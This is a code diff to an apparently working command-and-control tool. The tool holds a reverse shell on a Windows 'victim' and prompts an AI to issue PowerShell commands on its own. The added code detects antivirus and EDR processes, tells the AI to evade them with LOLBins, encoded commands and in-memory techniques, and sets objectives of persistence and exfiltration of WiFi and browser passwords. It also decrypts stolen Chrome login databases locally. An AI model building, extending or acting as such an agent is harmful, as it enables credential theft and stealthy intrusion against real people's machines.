@@ -25,6 +25,14 @@ from rich.prompt import Prompt
 
 console = Console()
 
+# Check for optional cryptography library (needed for browser password decryption)
+CRYPTO_AVAILABLE = False
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    pass  # Will warn user later if they try to use browser decryption
+
 # ============================================================================
 # TLS CERTIFICATE GENERATION
 # ============================================================================
@@ -86,6 +94,7 @@ class AgentState:
         self.is_admin = False
         self.os_version = None
         self.defender_status = None
+        self.edr_processes = []  # List of detected security/EDR processes
         self.wifi_passwords = []
         self.persistence_installed = False
         self.command_history = []
@@ -98,6 +107,7 @@ class AgentState:
             "is_admin": self.is_admin,
             "os_version": self.os_version,
             "defender_status": self.defender_status,
+            "edr_running": self.edr_processes,  # Include EDR info for AI
             "wifi_count": len(self.wifi_passwords),
             "persistence": self.persistence_installed,
             "iteration": self.iteration
@@ -154,6 +164,26 @@ def ask_ai_streaming(prompt, max_tokens=500):
 
 def build_ai_prompt(state, last_output=""):
     """Build the prompt for the AI to decide next action."""
+    
+    # Build EDR-aware guidance
+    edr_guidance = ""
+    if state.edr_processes:
+        edr_guidance = f"""
+EDR/SECURITY SOFTWARE DETECTED: {', '.join(state.edr_processes)}
+STEALTH MODE REQUIRED:
+- Use ONLY LOLBins (certutil, bitsadmin, mshta, wmic)
+- Use ONLY in-memory techniques
+- Avoid file writes to disk
+- Use encoded commands when possible
+"""
+    else:
+        edr_guidance = """
+NO EDR DETECTED - can use more aggressive techniques:
+- Direct file writes allowed
+- PowerShell scripts OK
+- Registry modifications OK
+"""
+    
     return f"""You are an autonomous pentesting AI with shell access to a Windows victim.
 
 CURRENT STATE:
@@ -161,16 +191,18 @@ CURRENT STATE:
 
 LAST COMMAND OUTPUT:
 {last_output[:1000] if last_output else "(none yet)"}
-
+{edr_guidance}
 OBJECTIVES (complete in order):
-1. RECON - Get hostname, username, check if admin (whoami /priv)
-2. PERSIST - Install persistence to survive reboot
-3. EXFIL - Extract WiFi passwords, browser data
+1. DETECT EDR - Check for security software: Get-Process | Where-Object {{$_.Name -match 'defender|crowdstrike|carbon|sentinel|cylance|sophos|mcafee|symantec'}}
+2. RECON - Get hostname, username, check if admin (whoami /priv)
+3. PERSIST - Install persistence (adapt based on EDR presence)
+4. EXFIL - Extract WiFi passwords, browser data
 
 RULES:
 - Respond with ONLY ONE PowerShell command
 - No explanations, just the command
-- Use short, efficient commands
+- Use short, efficient commands  
+- If EDR detected, use stealthier techniques
 - If objective done, move to next
 
 COMMAND:"""
@@ -225,6 +257,17 @@ def autonomous_mode():
                 state.persistence_installed = True
             if "Key Content" in result or "wifi" in command.lower():
                 state.wifi_passwords.append(result)
+            
+            # 9. Detect EDR processes from output
+            edr_names = ['defender', 'msmpeng', 'crowdstrike', 'csfalcon', 'carbonblack', 
+                        'sentinel', 'cylance', 'sophos', 'mcafee', 'symantec', 'eset', 
+                        'kaspersky', 'avast', 'avg', 'bitdefender', 'malwarebytes']
+            if result:
+                result_lower = result.lower()
+                for edr in edr_names:
+                    if edr in result_lower and edr not in [e.lower() for e in state.edr_processes]:
+                        state.edr_processes.append(edr.capitalize())
+                        console.print(f"[red]EDR Detected: {edr.capitalize()}[/]")
             
             # 9. Rate limit
             time.sleep(3)
@@ -543,12 +586,17 @@ class ShellManager:
                 pass
             self.conn.setblocking(1)
             
-            # Send command
-            self.conn.send((cmd + "\n").encode())
-            self.conn.settimeout(30)  # Increased timeout for longer operations
+            # Use unique delimiter for reliable output parsing
+            # This avoids issues with different shell prompts (PS, cmd, customized)
+            delimiter = "---END-CMD-OUTPUT---"
+            wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
+            
+            # Send command with delimiter
+            self.conn.send((wrapped_cmd + "\n").encode())
+            self.conn.settimeout(30)
             output = ""
             
-            # Read output until we see the prompt again
+            # Read output until we see our unique delimiter
             while True:
                 try:
                     chunk = self.conn.recv(4096).decode(errors='ignore')
@@ -556,26 +604,28 @@ class ShellManager:
                         break
                     output += chunk
                     
-                    # Check for PowerShell prompt - must be at end of output
-                    # Only break if the ENTIRE output ends with a prompt pattern
-                    stripped = output.rstrip()
-                    if stripped.endswith("PS>") or stripped.endswith("PS >"):
-                        break
-                    if stripped.endswith(">") and ("PS" in stripped[-50:] or ">" == stripped[-1]):
-                        # Likely a prompt, break
+                    # Check for our delimiter - reliable end detection
+                    if delimiter in output:
                         break
                 except socket.timeout:
                     break
             
-            # Clean up the output - remove prompt lines
+            # Clean up - remove delimiter and everything after it
+            if delimiter in output:
+                output = output.split(delimiter)[0]
+            
+            # Remove prompt lines and clean up
             lines = output.strip().split('\n')
             cleaned = []
             for line in lines:
                 stripped_line = line.strip()
-                # Skip prompt lines (PS> or PS C:\path>)
+                # Skip prompt lines
                 if stripped_line.startswith("PS") and stripped_line.endswith(">"):
                     continue
                 if stripped_line == "PS>":
+                    continue
+                # Skip the command echo
+                if cmd.strip() in stripped_line:
                     continue
                 cleaned.append(line)
             
@@ -1091,11 +1141,13 @@ foreach ($b in $browsers) {{
             # Decrypt locally
             import sqlite3
             import base64
-            try:
-                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-                HAS_CRYPTO = True
-            except ImportError:
-                HAS_CRYPTO = False
+            
+            if not CRYPTO_AVAILABLE:
+                console.print("[red]WARNING: 'cryptography' library not installed![/]")
+                console.print("[yellow]Browser password decryption requires: pip install cryptography[/]")
+                console.print("[dim]Files were exfiltrated but cannot be decrypted locally.[/]")
+                input("\n[Enter to continue]")
+                return
             
             # Find all key files for this target
             key_files = glob.glob(os.path.join(loot_dir, f"key_{target_ip}_*.txt"))
@@ -1126,7 +1178,7 @@ foreach ($b in $browsers) {{
                     with open(temp_db_path, "wb") as f:
                         f.write(base64.b64decode(b64_db))
                         
-                    if HAS_CRYPTO:
+                    if CRYPTO_AVAILABLE:
                         conn = sqlite3.connect(temp_db_path)
                         cursor = conn.cursor()
                         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
